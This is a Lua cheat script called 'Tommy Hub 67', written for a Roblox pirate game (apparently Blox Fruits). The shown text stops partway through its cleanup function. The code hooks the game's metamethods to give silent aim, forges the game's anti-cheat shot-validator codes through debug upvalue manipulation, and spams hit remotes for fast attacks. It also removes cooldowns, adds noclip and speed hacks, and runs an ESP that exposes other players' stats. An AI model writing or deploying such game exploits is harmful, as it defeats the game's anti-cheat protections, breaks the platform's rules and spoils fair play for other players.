--==============================================================
-- TOMMY HUB 67  |  Combat · Glitches · Soru · ESP
-- TikTok: @accountxz
--==============================================================
local Players      = game:GetService("Players")
local RunService  = game:GetService("RunService")
local UIS         = game:GetService("UserInputService")
local RS          = game:GetService("ReplicatedStorage")
local player      = Players.LocalPlayer
local camera      = workspace.CurrentCamera
local mouse       = player:GetMouse()
local VIM; pcall(function() VIM = game:GetService("VirtualInputManager") end)

local env = (getgenv and getgenv()) or _G
if env.TommyHub67 then pcall(env.TommyHub67) end -- limpia ejecución anterior

local conns, alive = {}, true
local function track(c) table.insert(conns, c) return c end

--==================== ESTADO ====================
local S = {
    -- Combat
    SkillAimbot=false, DragonM1=false, TargetPlayers=true, TargetMobs=false,
    TeamCheck=false, PvPCheck=true, SafeZoneCheck=true, MaxDist=2500, Rainbow=false,
    FastAttack=false, AntiStun=false, WalkSpeed=false, Speed=50,
    Dash=false, DashLen=50, Noclip=false, WaterWalk=false, AutoV4=false,
    AimlockP=false, AimlockN=false,
    -- Glitches
    SangNoCD=false, SangAuto=false, SangDrop=2, NoAnim=false, JumpPower=500,
    SoulGuitar=false, SoulDash=121, AntiLava=false, DelShip=false,
    -- Soru
    InfSoru=false, SoruAimbot=false, SoruTarget="Nearest", SoruDist=1000,
    PortalSoru=false, PortalSoruDelay=0.35,
    PortalSangC=false, PortalSangCDelay=0.35, PortalSangCTrigger="PortalF",
    FlashCombo=false, FlashWeapon="Fruit", FlashKey="Z", FlashDelay=0.3,
    -- ESP
    ESP=false, ESPName=true, ESPLevel=true, ESPBounty=true, ESPFruit=true,
    ESPDist=true, ESPHP=true, ESPHighlight=false, ESPSize=12,
}
local Blacklist = {}

--==================== HELPERS ====================
local function getHRP() local c = player.Character return c and c:FindFirstChild("HumanoidRootPart") end
local function getHum() local c = player.Character return c and c:FindFirstChildOfClass("Humanoid") end
local function pressKey(kc, hold)
    if not VIM or not kc then return end
    VIM:SendKeyEvent(true, kc, false, game)
    task.wait(hold or 0.05)
    VIM:SendKeyEvent(false, kc, false, game)
end
local SLOT_KEYS = {Enum.KeyCode.One, Enum.KeyCode.Two, Enum.KeyCode.Three, Enum.KeyCode.Four}
local ATTACK_KW = {"attack","slash","punch","m1","combo","hit","tool","ability","skill","kamehameha","bullet","gun","sword","melee","fruit"}
local function isAttackAnim(track)
    local n = string.lower(track.Name)
    for _, kw in ipairs(ATTACK_KW) do if string.find(n, kw) then return true end end
    return track.Priority == Enum.AnimationPriority.Action
end
local function stopNonAttackAnims()
    local h = getHum(); local a = h and h:FindFirstChildOfClass("Animator")
    if not a then return end
    for _, t in pairs(a:GetPlayingAnimationTracks()) do
        if not isAttackAnim(t) then t:Stop(0) end
    end
end

--==================== TARGETING ====================
local function pvpOn(p) return p:GetAttribute("PvpDisabled") ~= true end
local function inSafeZone(p)
    local ok, res = pcall(function()
        local c = p.Character; local r = c and c:FindFirstChild("HumanoidRootPart")
        local wo = workspace:FindFirstChild("_WorldOrigin")
        if not (r and wo) then return false end
        local sz = wo:FindFirstChild("SafeZones")
        if sz then
            for _, z in pairs(sz:GetChildren()) do
                local m = z:FindFirstChild("Mesh")
                if m and m:IsA("SpecialMesh") then
                    if (z.Position - r.Position).Magnitude <= (z.Size.X * m.Scale.X) / 2 then return true end
                end
            end
        end
        return false
    end)
    return ok and res
end
local function isEnemy(p)
    if p == player then return false end
    if S.TeamCheck and p.Team and player.Team and p.Team.Name == "Marines" and player.Team.Name == "Marines" then return false end
    return true
end

local function closestPlayerChar(maxDist)
    local me = getHRP(); if not me then return nil end
    local best, bd = nil, maxDist or math.huge
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player and not Blacklist[p.Name] and pvpOn(p) and p.Character then
            local r = p.Character:FindFirstChild("HumanoidRootPart")
            local h = p.Character:FindFirstChildOfClass("Humanoid")
            if r and h and h.Health > 0 then
                local d = (r.Position - me.Position).Magnitude
                if d < bd then bd = d; best = p.Character end
            end
        end
    end
    return best
end
local function closestNPC()
    local me = getHRP(); if not me then return nil end
    local en = workspace:FindFirstChild("Enemies") or workspace
    local best, bd = nil, S.MaxDist
    for _, n in pairs(en:GetChildren()) do
        if n:IsA("Model") and not Players:GetPlayerFromCharacter(n) then
            local r = n:FindFirstChild("HumanoidRootPart")
            local h = n:FindFirstChildOfClass("Humanoid")
            if r and h and h.Health > 0 then
                local d = (r.Position - me.Position).Magnitude
                if d < bd then bd = d; best = n end
            end
        end
    end
    return best
end

-- Objetivo del aimbot de habilidades
local currentTarget = nil
local function getAimbotTarget()
    local me = getHRP(); if not me then return nil end
    local best, bd = nil, S.MaxDist
    local function check(c)
        if not c or c == player.Character then return end
        local p = Players:GetPlayerFromCharacter(c)
        if p then
            if Blacklist[p.Name] or not isEnemy(p) then return end
            if S.PvPCheck and not pvpOn(p) then return end
            if S.SafeZoneCheck and inSafeZone(p) then return end
        end
        local h = c:FindFirstChildOfClass("Humanoid")
        local part = c:FindFirstChild("HumanoidRootPart")
        if h and h.Health > 0 and part then
            local d = (part.Position - me.Position).Magnitude
            if d < bd then bd = d; best = part end
        end
    end
    if S.TargetPlayers then for _, p in ipairs(Players:GetPlayers()) do if p ~= player then check(p.Character) end end end
    if S.TargetMobs then
        local en = workspace:FindFirstChild("Enemies")
        if en then for _, e in ipairs(en:GetChildren()) do check(e) end end
    end
    return best
end

local function soruTargetPart()
    local name = S.SoruTarget
    local c
    if name == "Nearest" then c = closestPlayerChar(S.SoruDist)
    else local p = Players:FindFirstChild(name); c = p and p.Character end
    return c and c:FindFirstChild("HumanoidRootPart")
end

--==================== HOOKS (Silent Aim / Soru Aimbot) ====================
if hookmetamethod and newcclosure and checkcaller and getnamecallmethod then
    pcall(function()
        local oldNC
        oldNC = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
            if alive and S.SkillAimbot and currentTarget and not checkcaller() then
                local m = getnamecallmethod()
                if m == "FireServer" or m == "InvokeServer" then
                    local args = table.pack(...)
                    local changed = false
                    for i = 1, args.n do
                        local a = args[i]
                        if typeof(a) == "Vector3" then args[i] = currentTarget.Position; changed = true
                        elseif typeof(a) == "CFrame" then args[i] = CFrame.new(currentTarget.Position); changed = true end
                    end
                    if changed then return oldNC(self, table.unpack(args, 1, args.n)) end
                end
            end
            return oldNC(self, ...)
        end))
        local oldIdx
        oldIdx = hookmetamethod(game, "__index", newcclosure(function(self, k)
            if alive and self == mouse and (k == "Hit" or k == "Target") and not checkcaller() then
                if S.SoruAimbot then
                    local t = soruTargetPart()
                    local me = getHRP()
                    if t and me and (t.Position - me.Position).Magnitude <= S.SoruDist then
                        if k == "Hit" then return CFrame.new(t.Position) end
                        return t
                    end
                end
                if S.SkillAimbot and currentTarget then
                    if k == "Hit" then return CFrame.new(currentTarget.Position) end
                    return currentTarget
                end
            end
            return oldIdx(self, k)
        end))
    end)
end

-- Highlight arcoíris en el objetivo
local rainbowHL
track(RunService.RenderStepped:Connect(function()
    if S.SkillAimbot or S.Rainbow then currentTarget = getAimbotTarget() else currentTarget = nil end
    if S.Rainbow and currentTarget and currentTarget.Parent then
        local c = currentTarget.Parent
        if not rainbowHL or rainbowHL.Parent ~= c then
            if rainbowHL then rainbowHL:Destroy() end
            rainbowHL = Instance.new("Highlight")
            rainbowHL.Name = "TommyTargetHL"; rainbowHL.Adornee = c
            rainbowHL.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            rainbowHL.FillTransparency = 0.2; rainbowHL.Parent = c
        end
        local hue = (tick() * 0.7) % 1
        rainbowHL.FillColor = Color3.fromHSV(hue, 1, 1)
        rainbowHL.OutlineColor = Color3.fromHSV((hue + 0.25) % 1, 1, 1)
    elseif rainbowHL then rainbowHL:Destroy(); rainbowHL = nil end
end))

--==================== AIMLOCK DE CÁMARA ====================
local lockP, lockN
track(RunService.RenderStepped:Connect(function()
    local function aim(c)
        local r = c and c:FindFirstChild("HumanoidRootPart")
        local h = c and c:FindFirstChildOfClass("Humanoid")
        if r and h and h.Health > 0 then
            camera.CFrame = camera.CFrame:Lerp(CFrame.lookAt(camera.CFrame.Position, r.Position + Vector3.new(0, 0.5, 0)), 0.4)
            return true
        end
    end
    if S.AimlockP then
        if not (lockP and lockP.Parent) then lockP = closestPlayerChar(S.MaxDist) end
        if not aim(lockP) then lockP = nil end
    else lockP = nil end
    if S.AimlockN then
        if not (lockN and lockN.Parent) then lockN = closestNPC() end
        if not aim(lockN) then lockN = nil end
    else lockN = nil end
end))

--==================== DRAGON GUN M1 ====================
local ShootEvent, Validator2, ShootFunction
local V = {v26=12, v22=13, v25=14, v21=15, v23=16, v24=17, v27=18}
local getupval  = debug and (debug.getupvalue or getupvalue) or getupvalue
local setupval  = debug and (debug.setupvalue or setupvalue) or setupvalue
local getupvals = debug and (debug.getupvalues or getupvalues) or getupvalues
task.spawn(function()
    pcall(function()
        local net = RS:WaitForChild("Modules", 3):WaitForChild("Net", 3)
        ShootEvent = net:WaitForChild("RE/ShootGunEvent", 3)
        Validator2 = RS:WaitForChild("Remotes", 3):WaitForChild("Validator2", 3)
    end)
end)
local function nextValidator()
    if not ShootFunction then
        local ok, res = pcall(require, RS:WaitForChild("Controllers"):WaitForChild("CombatController"))
        if ok and type(res) == "table" and res.Attack then ShootFunction = getupval(res.Attack, 9) end
    end
    if not (ShootFunction and getupvals) then return 0, 0 end
    local up = getupvals(ShootFunction); if not up then return 0, 0 end
    if up[V.v21] ~= 727595 then
        for i, v in pairs(up) do
            if v == 727595 then
                local o = i - 15
                V.v21=i; V.v22=13+o; V.v23=16+o; V.v24=17+o; V.v26=12+o; V.v25=14+o; V.v27=18+o
                break
            end
        end
    end
    local v1,v2,v3,v4 = getupval(ShootFunction,V.v21), getupval(ShootFunction,V.v22), getupval(ShootFunction,V.v23), getupval(ShootFunction,V.v24)
    local v5,v6,v7 = getupval(ShootFunction,V.v25), getupval(ShootFunction,V.v26), getupval(ShootFunction,V.v27)
    if not (v1 and v2 and v3 and v4 and v5 and v6 and v7) then return 0, 0 end
    local v8 = v6 * v2
    local v9 = (v5 * v2 + v6 * v1) % v3
    v9 = (v9 * v3 + v8) % v4
    v5 = math.floor(v9 / v3); v6 = v9 - v5 * v3; v7 = v7 + 1
    setupval(ShootFunction, V.v25, v5); setupval(ShootFunction, V.v26, v6); setupval(ShootFunction, V.v27, v7)
    return math.floor(v9 / v4 * 16777215), v7
end
task.spawn(function()
    while alive do
        task.wait(0.085)
        if S.DragonM1 then pcall(function()
            local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
            if not tool or tool.ToolTip ~= "Gun" then return end
            local best, bd = nil, math.huge
            local me = getHRP(); if not me then return end
            local function consider(c)
                local r = c and c:FindFirstChild("HumanoidRootPart"); local h = c and c:FindFirstChildOfClass("Humanoid")
                if r and h and h.Health > 0 then
                    local d = (r.Position - me.Position).Magnitude
                    if d < bd then bd = d; best = r end
                end
            end
            if S.TargetMobs then local en = workspace:FindFirstChild("Enemies"); if en then for _, e in ipairs(en:GetChildren()) do consider(e) end end end
            if S.TargetPlayers then for _, p in ipairs(Players:GetPlayers()) do if p ~= player then consider(p.Character) end end end
            if not best or not ShootEvent then return end
            local code, count = nextValidator()
            if code ~= 0 and Validator2 then Validator2:FireServer(code, count) end
            tool:SetAttribute("LocalOverheat", 0)
            tool:SetAttribute("LocalTotalShots", (tool:GetAttribute("LocalTotalShots") or 0) + 1)
            ShootEvent:FireServer(best.Position, {best})
        end) end
    end
end)

--==================== FAST ATTACK ====================
local RegisterHit, RegisterAttack
task.spawn(function()
    for _, v in pairs(RS:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            if v.Name == "RE/RegisterHit" then RegisterHit = v end
            if v.Name == "RE/RegisterAttack" then RegisterAttack = v end
        end
    end
end)
local fastRunning = false
local function startFastAttack()
    if fastRunning then return end
    fastRunning = true
    task.spawn(function()
        while alive and S.FastAttack do
            RunService.Stepped:Wait()
            local me = getHRP()
            if me and RegisterHit and RegisterAttack then
                local list = {}
                local function add(c)
                    local h = c and c:FindFirstChildOfClass("Humanoid"); local r = c and c:FindFirstChild("HumanoidRootPart"); local hd = c and c:FindFirstChild("Head")
                    if h and r and hd and h.Health > 0 and (r.Position - me.Position).Magnitude <= 2500 then table.insert(list, {c, hd}) end
                end
                for _, p in ipairs(Players:GetPlayers()) do if p ~= player and not Blacklist[p.Name] then add(p.Character) end end
                local en = workspace:FindFirstChild("Enemies")
                if en then for _, n in ipairs(en:GetChildren()) do add(n) end end
                if #list > 0 then
                    pcall(function() RegisterAttack:FireServer(0); RegisterHit:FireServer(list[1][2], list) end)
                end
            end
        end
        fastRunning = false
    end)
end

--==================== ANTI STUN / HITBOX [BETA] ====================
local asConns = {}
local function setAntiStun(on)
    S.AntiStun = on
    for _, c in pairs(asConns) do c:Disconnect() end
    asConns = {}
    if on then
        table.insert(asConns, RunService.Heartbeat:Connect(function()
            pcall(function()
                local c = player.Character; if not c then return end
                c:SetAttribute("AllCooldown", 0); c:SetAttribute("FlashstepCooldown", 1)
                c:SetAttribute("UsingSkill", false); c:SetAttribute("isUsingSkill", false); c:SetAttribute("Busy", false)
                local h, r = c:FindFirstChildOfClass("Humanoid"), c:FindFirstChild("HumanoidRootPart")
                if h and h.WalkSpeed < 16 then h.WalkSpeed = 16 end
                if r then for _, v in ipairs(r:GetChildren()) do if v:IsA("BodyVelocity") or v:IsA("BodyPosition") then v:Destroy() end end end
            end)
        end))
        table.insert(asConns, UIS.InputBegan:Connect(function(i, gp)
            if gp then return end
            local db = player.Character and player.Character:FindFirstChild("Dark Blade")
            local re = db and db:FindFirstChild("RemoteEvent")
            if re then
                if i.KeyCode == Enum.KeyCode.Z then re:FireServer("Z") elseif i.KeyCode == Enum.KeyCode.X then re:FireServer("X") end
            end
        end))
    else
        pcall(function()
            local c = player.Character
            if c then for _, a in ipairs({"AllCooldown","FlashstepCooldown","UsingSkill","isUsingSkill","Busy"}) do c:SetAttribute(a, nil) end end
        end)
    end
end

--==================== MOVIMIENTO ====================
track(RunService.Stepped:Connect(function()
    local c = player.Character; if not c then return end
    if S.WalkSpeed then
        local h, r = c:FindFirstChildOfClass("Humanoid"), c:FindFirstChild("HumanoidRootPart")
        if h and r then
            h.WalkSpeed = S.Speed
            if h.MoveDirection.Magnitude > 0 and S.Speed > 20 then r.CFrame = r.CFrame + h.MoveDirection * (S.Speed / 100) end
        end
    end
    if S.Noclip then
        for _, p in pairs(c:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = false end end
    end
end))
local function applyDash(len)
    pcall(function()
        local c = player.Character
        if c then c:SetAttribute("DashLength", len); c:SetAttribute("DashLengthAir", len) end
    end)
end
task.spawn(function()
    while alive do
        task.wait(0.1)
        if S.Dash and not S.SoulGuitar then applyDash(S.DashLen) end
    end
end)
task.spawn(function()
    local wp
    while alive do
        task.wait(0.15)
        if S.WaterWalk then
            if not (wp and wp.Parent) then
                wp = Instance.new("Part"); wp.Size = Vector3.new(200,1,200); wp.Transparency = 1
                wp.Anchored = true; wp.CanCollide = false; wp.Name = "TommyWater"; wp.Parent = workspace
            end
            local r = getHRP()
            if r and r.Position.Y >= 9.5 then wp.Position = Vector3.new(r.Position.X, 9.2, r.Position.Z); wp.CanCollide = true
            else wp.CanCollide = false end
        elseif wp then wp:Destroy(); wp = nil end
    end
end)
task.spawn(function()
    while alive do
        task.wait(0.5)
        if S.AutoV4 then pcall(function()
            local c = player.Character
            local e = c and c:GetAttribute("RaceEnergy")
            if e and e >= 100 then
                local awk = player.Backpack:FindFirstChild("Awakening") or c:FindFirstChild("Awakening")
                if awk and awk:FindFirstChild("RemoteFunction") then awk.RemoteFunction:InvokeServer(true)
                else
                    local rem = RS:FindFirstChild("Remotes")
                    if rem and rem:FindFirstChild("CommF_") then rem.CommF_:InvokeServer("Awakening", true) end
                end
            end
        end) end
    end
end)

--==================== GLITCHES ====================
-- Sanguine Z sin cooldown
local function applySangNoCD(c) if S.SangNoCD and c then c:SetAttribute("AllCooldown", 3) end end
track(player.CharacterAdded:Connect(function(c) task.wait(0.5); applySangNoCD(c) end))

-- Sanguine Z (lag + empuje)
local lagBusy = false
local function lagFor(dur)
    if lagBusy then return end
    lagBusy = true
    local stop, interval = tick() + dur, 1 / 20
    local con
    con = RunService.RenderStepped:Connect(function()
        if tick() > stop then con:Disconnect(); lagBusy = false; return end
        local t0 = tick()
        while tick() - t0 < interval do end
    end)
end
local function pushForward(speed, life)
    local r = getHRP(); if not r then return end
    local att = Instance.new("Attachment", r)
    local lv = Instance.new("LinearVelocity")
    lv.MaxForce = math.huge; lv.VelocityConstraintMode = Enum.VelocityConstraintMode.Vector
    lv.VectorVelocity = camera.CFrame.LookVector * speed; lv.Attachment0 = att; lv.Parent = r
    task.delay(life, function() if lv then lv:Destroy() end if att then att:Destroy() end end)
end
local function sangManual() lagFor(0.43); pushForward(400, 0.9) end

local sangConn, sangCD = nil, false
local function startSangAuto()
    if sangConn then sangConn:Disconnect(); sangConn = nil end
    local h = getHum(); if not h then return end
    sangConn = h.AnimationPlayed:Connect(function(t)
        if not S.SangAuto or sangCD then return end
        local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
        if not tool or not (string.find(string.lower(tool.Name), "sanguine") or string.find(string.lower(tool.Name), "art")) then return end
        local id = tostring(t.Animation and t.Animation.AnimationId or "")
        if id:find("14586872029") or id:find("14418367908") or id:find("14418370048") then
            sangCD = true
            lagFor(S.SangDrop); pushForward(400, 0.9)
            task.delay(S.SangDrop + 0.5, function() sangCD = false end)
        end
    end)
end
track(player.CharacterAdded:Connect(function() task.wait(0.5); if S.SangAuto then startSangAuto() end end))

-- No animations
track(RunService.Stepped:Connect(function()
    if not S.NoAnim then return end
    local h = getHum(); if h then h.AutoRotate = true end
    stopNonAttackAnims()
end))

-- Super Jump
local function superJump()
    local r, h = getHRP(), getHum()
    if not r or not h or h.Health <= 0 then return end
    stopNonAttackAnims()
    r.AssemblyLinearVelocity = Vector3.new(r.AssemblyLinearVelocity.X, S.JumpPower, r.AssemblyLinearVelocity.Z)
    h:ChangeState(Enum.HumanoidStateType.Jumping)
end

-- Soul Guitar
local guitarBusy = false
local function soulGuitarJump()
    if guitarBusy then return end
    local c = player.Character; local r, h = getHRP(), getHum()
    if not (c and r and h) then return end
    local tool = c:FindFirstChild("Skull Guitar") or player.Backpack:FindFirstChild("Skull Guitar")
    if not tool then return end
    guitarBusy = true
    if tool.Parent == player.Backpack then h:EquipTool(tool); task.wait(0.15) end
    pcall(function()
        local eq = tool:FindFirstChild("EquipEvent"); if eq then eq:FireServer(true) end
        local rem = RS:FindFirstChild("Remotes")
        local val = rem and rem:FindFirstChild("Validator2"); if val then val:FireServer(15627583, 1) end
        local re = tool:FindFirstChild("RemoteEvent"); if re then re:FireServer("TAP", mouse.Hit.Position) end
    end)
    stopNonAttackAnims()
    local look = r.CFrame.LookVector
    local flat = Vector3.new(look.X, 0, look.Z)
    if flat.Magnitude > 0 then flat = flat.Unit end
    local att = Instance.new("Attachment", r)
    local lv = Instance.new("LinearVelocity")
    lv.MaxForce = math.huge; lv.VelocityConstraintMode = Enum.VelocityConstraintMode.Vector
    lv.VectorVelocity = Vector3.new(flat.X * 180, 80, flat.Z * 180); lv.Attachment0 = att; lv.Parent = r
    h:ChangeState(Enum.HumanoidStateType.Jumping)
    task.delay(0.7, function() if lv then lv:Destroy() end if att then att:Destroy() end end)
    local tc
    tc = RunService.Stepped:Connect(function()
        if not c.Parent or not h.Parent then tc:Disconnect(); return end
        h.AutoRotate = true
        stopNonAttackAnims()
        if h.FloorMaterial ~= Enum.Material.Air then tc:Disconnect() end
    end)
    task.wait(0.6)
    guitarBusy = false
end
track(UIS.InputBegan:Connect(function(i, gp)
    if gp then return end
    if i.UserInputType == Enum.UserInputType.MouseButton1 and S.SoulGuitar then soulGuitarJump() end
end))

-- Anti lava
track(RunService.Stepped:Connect(function()
    if not S.AntiLava then return end
    local c = player.Character; if not c then return end
    for _, p in pairs(c:GetDescendants()) do
        if p:IsA("BasePart") and not ({HumanoidRootPart=1, Torso=1, UpperTorso=1, LowerTorso=1, Head=1})[p.Name] then p.CanTouch = false end
    end
end))

-- Borrar Barco Fantasma
task.spawn(function()
    local ships = {"CursedShip", "Cursed Ship", "Ship"}
    local ext = {"Wall","Floor","Ceiling","Base","Hull","Window","DoorFrame"}
    while alive do
        task.wait(3)
        if S.DelShip then pcall(function()
            for _, o in pairs(workspace:GetDescendants()) do
                for _, sn in pairs(ships) do
                    if o.Name:find(sn) and (o:IsA("Model") or o:IsA("Folder")) then
                        for _, ch in pairs(o:GetDescendants()) do
                            if ch:IsA("BasePart") and not ch.Parent:FindFirstChild("Humanoid") then
                                local keep = false
                                for _, e in pairs(ext) do if ch.Name:find(e) then keep = true break end end
                                if not keep then ch:Destroy() end
                            end
                        end
                    end
                end
            end
        end) end
    end
end)

--==================== SORU ====================
local function attachInfSoru(c)
    if not c then return end
    if S.InfSoru then c:SetAttribute("FlashstepCooldown", 1) end
    track(c.AttributeChanged:Connect(function(a)
        if a == "FlashstepCooldown" and S.InfSoru and c:GetAttribute(a) ~= 1 then c:SetAttribute(a, 1) end
    end))
end
track(player.CharacterAdded:Connect(attachInfSoru))
if player.Character then attachInfSoru(player.Character) end
task.spawn(function()
    while alive do
        task.wait(0.5)
        if S.InfSoru and player.Character then pcall(function() player.Character:SetAttribute("FlashstepCooldown", 1) end) end
    end
end)

local FLASH_NAMES = {"flashstepregular","flashstepdraco","flashstep","soru"}
local FLASH_IDS = {"17555632156","18461649274","616006778","616010882","5403485593","5403491911"}
local function isFlashstep(t)
    local n = string.lower(t.Name)
    for _, f in ipairs(FLASH_NAMES) do if string.find(n, f) then return true end end
    local id = t.Animation and t.Animation.AnimationId:match("%d+") or ""
    for _, f in ipairs(FLASH_IDS) do if id == f then return true end end
    return false
end

local function holdingPortal()
    local t = player.Character and player.Character:FindFirstChildOfClass("Tool")
    if not t then return false end
    local n = string.lower(t.Name)
    return string.find(n, "portal") or string.find(n, "door")
end
local function equipByName(...)
    local h = getHum(); if not h then return end
    local bp = player:FindFirstChild("Backpack"); if not bp then return end
    for _, t in ipairs(bp:GetChildren()) do
        local n = string.lower(t.Name)
        for _, kw in ipairs({...}) do
            if string.find(n, kw) then h:EquipTool(t); task.wait(0.1); return t end
        end
    end
end
local function portalCombo()
    if not holdingPortal() then equipByName("portal", "door"); task.wait(0.08) end
    if not holdingPortal() then return end
    task.wait(S.PortalSoruDelay)
    pressKey(Enum.KeyCode.X); task.wait(0.15); pressKey(Enum.KeyCode.Z)
end
local function portalSangC()
    task.wait(S.PortalSangCDelay)
    equipByName("sanguine"); task.wait(0.1)
    pressKey(Enum.KeyCode.C, 0.15)
end
local function flashCombo()
    task.wait(S.FlashDelay)
    if not S.FlashCombo then return end
    local slot = ({Melee=1, Fruit=2, Sword=3, Gun=4})[S.FlashWeapon] or 2
    pressKey(SLOT_KEYS[slot], 0.06); task.wait(0.12)
    local kc = Enum.KeyCode[S.FlashKey]; if kc then pressKey(kc, 0.06) end
end
local function monitorChar(c)
    local h = c:WaitForChild("Humanoid", 5); if not h then return end
    track(h.AnimationPlayed:Connect(function(t)
        local n = string.lower(t.Name)
        local isPortalF = n:find("portal") or n:find("teleport") or n:find("warp") or n:find("door") or n:find("world")
        local isSoru = isFlashstep(t)
        if S.PortalSoru and isSoru then task.spawn(portalCombo) end
        if S.PortalSangC and ((S.PortalSangCTrigger == "PortalF" and isPortalF) or (S.PortalSangCTrigger == "Soru" and isSoru)) then
            task.spawn(portalSangC)
        end
        if S.FlashCombo and isSoru then task.spawn(flashCombo) end
    end))
end
track(player.CharacterAdded:Connect(monitorChar))
if player.Character then monitorChar(player.Character) end
track(UIS.InputBegan:Connect(function(i, gp)
    if gp then return end
    if i.KeyCode == Enum.KeyCode.F and S.PortalSangC and S.PortalSangCTrigger == "PortalF" and holdingPortal() then
        task.spawn(portalSangC)
    end
end))

--==================== ESP ====================
local esp = {}
local cache = {}
local function clearESP(p)
    local d = esp[p]
    if d then pcall(function() d.gui:Destroy() if d.hl then d.hl:Destroy() end end) esp[p] = nil end
end
local function pdata(p)
    local d = cache[p]
    if not d then d = {level="?", fruit="None", bounty=0, t=0}; cache[p] = d end
    if tick() - d.t > 5 then
        pcall(function() d.level = p.Data.Level.Value end)
        pcall(function() d.fruit = p.Data.DevilFruit.Value end)
        pcall(function() d.bounty = p.leaderstats["Bounty/Honor"].Value end)
        d.t = tick()
    end
    return d
end
local function updateESP()
    local me = getHRP()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player then
            local c = p.Character
            local head = c and c:FindFirstChild("Head")
            local h = c and c:FindFirstChildOfClass("Humanoid")
            local r = c and c:FindFirstChild("HumanoidRootPart")
            if S.ESP and head and h and r and me then
                local d = esp[p]
                if not d or d.char ~= c or not d.gui.Parent then
                    clearESP(p)
                    local bb = Instance.new("BillboardGui")
                    bb.Adornee = head; bb.Size = UDim2.new(0,200,0,75); bb.StudsOffset = Vector3.new(0,3,0); bb.AlwaysOnTop = true; bb.Parent = head
                    local t = Instance.new("TextLabel", bb)
                    t.Size = UDim2.new(1,0,1,0); t.BackgroundTransparency = 1; t.RichText = true
                    t.Font = Enum.Font.SourceSansBold; t.TextStrokeTransparency = 0
                    d = {gui=bb, label=t, char=c}; esp[p] = d
                end
                local pd = pdata(p)
                local marine = p.Team and p.Team.Name == "Marines"
                d.label.TextColor3 = marine and Color3.fromRGB(0,170,255) or Color3.fromRGB(255,70,70)
                d.label.TextSize = S.ESPSize
                local parts = {}
                if S.ESPName then parts[#parts+1] = "[" .. (marine and "Marines" or "Pirates") .. "] <font color=\"rgb(255,255,0)\">" .. p.Name .. "</font>" end
                if S.ESPLevel then parts[#parts+1] = " [Lv." .. tostring(pd.level) .. "]" end
                if S.ESPBounty then
                    local off = p:GetAttribute("PvpDisabled") == true
                    local bm = type(pd.bounty) == "number" and math.floor(pd.bounty / 1000000) or 0
                    parts[#parts+1] = "\n" .. (off and "🟢 PvP OFF" or "🔴 PvP ON") .. " | Bounty: " .. bm .. "M\n"
                end
                if S.ESPFruit then parts[#parts+1] = "Fruit: " .. tostring(pd.fruit) .. "\n" end
                if S.ESPDist then parts[#parts+1] = math.floor((r.Position - me.Position).Magnitude) .. "m | " end
                if S.ESPHP then parts[#parts+1] = "HP " .. math.floor(h.Health / math.max(h.MaxHealth, 1) * 100) .. "%" end
                d.label.Text = table.concat(parts)
                if S.ESPHighlight then
                    if not d.hl or not d.hl.Parent then
                        local hl = Instance.new("Highlight")
                        hl.Name = "TommyESP"; hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                        hl.FillColor = Color3.fromRGB(255,0,0); hl.OutlineColor = Color3.fromRGB(255,0,0)
                        hl.FillTransparency = 0.5; hl.Parent = c; d.hl = hl
                    end
                elseif d.hl then d.hl:Destroy(); d.hl = nil end
            else clearESP(p) end
        end
    end
end
task.spawn(function()
    while alive do pcall(updateESP); task.wait(0.15) end
end)
track(Players.PlayerRemoving:Connect(function(p) clearESP(p); cache[p] = nil end))

--==================== UI ====================
local ACCENT = Color3.fromRGB(170, 0, 255)
local WHITE = Color3.fromRGB(255, 255, 255)
local function corner(o, r) Instance.new("UICorner", o).CornerRadius = UDim.new(0, r) end
local function stroke(o, c, t) local s = Instance.new("UIStroke", o); s.Color = c; s.Thickness = t or 1; return s end

local gui = Instance.new("ScreenGui")
gui.Name = "TommyHub67_UI"; gui.ResetOnSpawn = false; gui.DisplayOrder = 99999
pcall(function() gui.Parent = (gethui and gethui()) or game:GetService("CoreGui") end)
if not gui.Parent then gui.Parent = player:WaitForChild("PlayerGui") end

local main = Instance.new("Frame", gui)
main.Size = UDim2.new(0, 450, 0, 310); main.Position = UDim2.new(0.5, -225, 0.5, -155)
main.BackgroundColor3 = Color3.fromRGB(14, 12, 22); main.BackgroundTransparency = 0.05
main.Active = true; main.Draggable = true
corner(main, 12); stroke(main, ACCENT, 1.2)

local title = Instance.new("TextLabel", main)
title.Text = "TOMMY HUB 67"; title.Font = Enum.Font.GothamBlack; title.TextSize = 16
title.TextColor3 = ACCENT; title.BackgroundTransparency = 1
title.Size = UDim2.new(0, 160, 0, 28); title.Position = UDim2.new(0, 12, 0, 6)
title.TextXAlignment = Enum.TextXAlignment.Left
local sub = Instance.new("TextLabel", main)
sub.Text = "TikTok: @accountxz"; sub.Font = Enum.Font.GothamBold; sub.TextSize = 10
sub.TextColor3 = WHITE; sub.BackgroundTransparency = 1
sub.Size = UDim2.new(0, 160, 0, 28); sub.Position = UDim2.new(0.5, -80, 0, 6)

local openBtn = Instance.new("TextButton", gui)
openBtn.Size = UDim2.new(0, 42, 0, 42); openBtn.Position = UDim2.new(0, 15, 0, 15)
openBtn.Text = "T67"; openBtn.Font = Enum.Font.GothamBlack; openBtn.TextSize = 12
openBtn.TextColor3 = WHITE; openBtn.BackgroundColor3 = Color3.fromRGB(14, 12, 22)
openBtn.Visible = false; openBtn.Active = true; openBtn.Draggable = true
corner(openBtn, 8); stroke(openBtn, ACCENT, 1.6)
local function setOpen(v) main.Visible = v; openBtn.Visible = not v end
openBtn.MouseButton1Click:Connect(function() setOpen(true) end)

local function topBtn(txt, x, col, cb)
    local b = Instance.new("TextButton", main)
    b.Text = txt; b.Font = Enum.Font.GothamBlack; b.TextSize = 14; b.TextColor3 = col
    b.BackgroundTransparency = 1; b.Size = UDim2.new(0, 22, 0, 22); b.Position = UDim2.new(1, x, 0, 9)
    corner(b, 6); stroke(b, col, 1)
    b.MouseButton1Click:Connect(cb)
end
local function cleanup()
    alive = false
    S.SkillAimbot = false; S.SoruAimbot = false
    setAntiStun(false)
    for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
    for p in pairs(esp) do clearESP(p) end
